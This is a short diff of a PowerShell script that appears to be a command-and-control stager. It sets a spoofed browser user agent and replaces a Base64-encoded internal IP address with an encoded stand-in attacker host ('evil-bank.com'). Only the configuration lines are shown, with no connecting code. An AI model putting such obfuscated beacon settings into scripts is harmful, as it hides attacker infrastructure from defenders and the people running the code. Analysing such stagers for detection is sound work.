@@ -12,7 +12,7 @@ $u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
 
 # Decode a Base64-encoded server address
 $ser = [Text.Encoding]::Unicode.GetString(
-    [Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAALgAxADkALgAxADAALgAxADQAMgA6ADgAMAA=')
+    [Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC0AYgBhAG4AawAuAGMAbwBtADoAOAAwAA==')
 )
 
 # Define the endpoint path
